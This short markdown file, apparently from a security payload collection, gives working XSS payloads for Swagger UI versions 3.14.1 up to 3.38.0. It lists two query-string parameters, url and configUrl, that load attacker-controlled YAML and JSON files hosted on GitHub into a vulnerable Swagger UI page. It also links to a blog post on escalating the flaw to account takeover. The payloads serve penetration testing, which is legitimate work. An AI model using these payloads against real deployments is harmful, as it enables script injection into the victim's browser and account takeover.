# Swagger UI >=3.14.1 < 3.38.0 XSS payload

- Swagger UI version affected: `>=3.14.1 < 3.38.0`

## Payloads Test

### `url`
`?url=https://raw.githubusercontent.com/ClearGate-Int/swagger-UI_xss/main/xss-fetch.yaml`
### `configUrl`
`?configUrl=https://raw.githubusercontent.com/ClearGate-Int/swagger-UI_xss/main/config.json`

**More info at**: https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/
